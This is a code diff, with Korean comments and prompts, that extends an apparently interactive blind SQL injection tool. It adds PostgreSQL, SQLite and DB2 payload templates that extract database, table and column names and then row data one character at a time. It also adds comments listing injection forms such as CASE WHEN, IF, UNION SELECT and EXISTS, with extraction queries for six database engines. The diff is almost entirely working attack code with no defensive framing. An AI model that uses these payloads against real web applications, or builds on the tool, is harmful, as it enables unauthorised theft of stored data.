@@ -32,8 +32,73 @@ payload_templates = {
         "table_name": "1 AND SUBSTR((SELECT table_name FROM (SELECT table_name, ROWNUM AS rn FROM all_tables WHERE owner=USER) WHERE rn={index}), {i}, 1) = '{char}' --",
         "column_name": "1 AND SUBSTR((SELECT column_name FROM (SELECT column_name, ROWNUM AS rn FROM all_tab_columns WHERE table_name=UPPER('{table_name}')) WHERE rn={index}), {i}, 1) = '{char}' --",
         "column_data": "1 AND SUBSTR((SELECT {column_name} FROM (SELECT {column_name}, ROWNUM AS rn FROM {table_name}) WHERE rn={index}), {i}, 1) = '{char}' --"
+    },
+    "postgresql": {
+        "database_name": "1 AND SUBSTRING((SELECT current_database()), {i}, 1) = '{char}' --",
+        "table_name": "1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' OFFSET {index} LIMIT 1), {i}, 1) = '{char}' --",
+        "column_name": "1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' OFFSET {index} LIMIT 1), {i}, 1) = '{char}' --",
+        "column_data": "1 AND SUBSTRING((SELECT {column_name} FROM {table_name} OFFSET {index} LIMIT 1), {i}, 1) = '{char}' --"
+    },
+    "sqlite": {
+        "database_name": "1 AND SUBSTR((SELECT name FROM sqlite_master WHERE type='database' LIMIT 1), {i}, 1) = '{char}' --",
+        "table_name": "1 AND SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT {index}, 1), {i}, 1) = '{char}' --",
+        "column_name": "1 AND SUBSTR((SELECT name FROM pragma_table_info('{table_name}') LIMIT {index}, 1), {i}, 1) = '{char}' --",
+        "column_data": "1 AND SUBSTR((SELECT {column_name} FROM {table_name} LIMIT {index}, 1), {i}, 1) = '{char}' --"
+    },
+    "db2": {
+        "database_name": "1 AND SUBSTR((SELECT CURRENT SERVER FROM sysibm.sysdummy1), {i}, 1) = '{char}' --",
+        "table_name": "1 AND SUBSTR((SELECT tabname FROM syscat.tables WHERE tabschema=current_schema ORDER BY tabname OFFSET {index} ROWS FETCH FIRST 1 ROWS ONLY), {i}, 1) = '{char}' --",
+        "column_name": "1 AND SUBSTR((SELECT colname FROM syscat.columns WHERE tabname='{table_name}' ORDER BY colname OFFSET {index} ROWS FETCH FIRST 1 ROWS ONLY), {i}, 1) = '{char}' --",
+        "column_data": "1 AND SUBSTR((SELECT {column_name} FROM {table_name} ORDER BY {column_name} OFFSET {index} ROWS FETCH FIRST 1 ROWS ONLY), {i}, 1) = '{char}' --"
     }
 }
+
+# 다양한 SQL 구문 예시 주석 처리:
+# 1. "CASE WHEN" 구문: "1 AND CASE WHEN (조건문) THEN 1 ELSE 0 END = 1 --"
+#    - 특정 조건이 참일 때와 거짓일 때 결과를 다르게 하여 참/거짓을 판별할 수 있습니다.
+# 2. "IF" 구문 (MySQL 전용): "1 AND IF(조건문, 1, 0) = 1 --"
+#    - 조건문이 참이면 1, 거짓이면 0을 반환하여 SQL 인젝션에 사용할 수 있습니다.
+# 3. "UNION SELECT" 구문: "1 UNION SELECT column1, column2 FROM table_name --"
+#    - 데이터베이스에서 여러 값을 한번에 반환받기 위해 사용됩니다.
+# 4. "AND EXISTS" 구문: "1 AND EXISTS(SELECT 1 FROM table_name WHERE 조건문) --"
+#    - 특정 조건에 해당하는 데이터가 존재하는지 여부를 판별하는 데 사용됩니다.
+#
+# 각 데이터베이스별 데이터베이스 이름, 테이블 이름, 컬럼 이름, 데이터 추출하는 구문 예시:
+# MySQL:
+# - 데이터베이스 이름: "SELECT DATABASE()"
+# - 테이블 이름: "SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()"
+# - 컬럼 이름: "SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'"
+# - 데이터 추출: "SELECT {column_name} FROM {table_name}"
+#
+# MSSQL:
+# - 데이터베이스 이름: "SELECT DB_NAME()"
+# - 테이블 이름: "SELECT name FROM sys.tables"
+# - 컬럼 이름: "SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('{table_name}')"
+# - 데이터 추출: "SELECT {column_name} FROM {table_name}"
+#
+# Oracle:
+# - 데이터베이스 이름: "SELECT sys_context('userenv','db_name') FROM dual"
+# - 테이블 이름: "SELECT table_name FROM all_tables WHERE owner=USER"
+# - 컬럼 이름: "SELECT column_name FROM all_tab_columns WHERE table_name=UPPER('{table_name}')"
+# - 데이터 추출: "SELECT {column_name} FROM {table_name}"
+#
+# PostgreSQL:
+# - 데이터베이스 이름: "SELECT current_database()"
+# - 테이블 이름: "SELECT table_name FROM information_schema.tables WHERE table_schema='public'"
+# - 컬럼 이름: "SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'"
+# - 데이터 추출: "SELECT {column_name} FROM {table_name}"
+#
+# SQLite:
+# - 데이터베이스 이름: "SELECT name FROM sqlite_master WHERE type='database'"
+# - 테이블 이름: "SELECT name FROM sqlite_master WHERE type='table'"
+# - 컬럼 이름: "PRAGMA table_info('{table_name}')"
+# - 데이터 추출: "SELECT {column_name} FROM {table_name}"
+#
+# DB2:
+# - 데이터베이스 이름: "SELECT CURRENT SERVER FROM sysibm.sysdummy1"
+# - 테이블 이름: "SELECT tabname FROM syscat.tables WHERE tabschema=current_schema"
+# - 컬럼 이름: "SELECT colname FROM syscat.columns WHERE tabname='{table_name}'"
+# - 데이터 추출: "SELECT {column_name} FROM {table_name}"
 
 # 참/거짓 판별 함수
 def is_true_response(response):
@@ -131,9 +196,9 @@ def main():
                 print("잘못된 요청 방식입니다. GET 또는 POST 중 하나를 입력하세요.")
                 continue
 
-            db_type = input("데이터베이스 종류를 선택하세요 (mysql/mssql/oracle): ").strip().lower()
-            if db_type not in ["mysql", "mssql", "oracle"]:
-                print("잘못된 데이터베이스 종류입니다. mysql, mssql, oracle 중 하나를 입력하세요.")
+            db_type = input("데이터베이스 종류를 선택하세요 (mysql/mssql/oracle/postgresql/sqlite/db2): ").strip().lower()
+            if db_type not in ["mysql", "mssql", "oracle", "postgresql", "sqlite", "db2"]:
+                print("잘못된 데이터베이스 종류입니다. mysql, mssql, oracle, postgresql, sqlite, db2 중 하나를 입력하세요.")
                 continue
 
         if choice == "1":
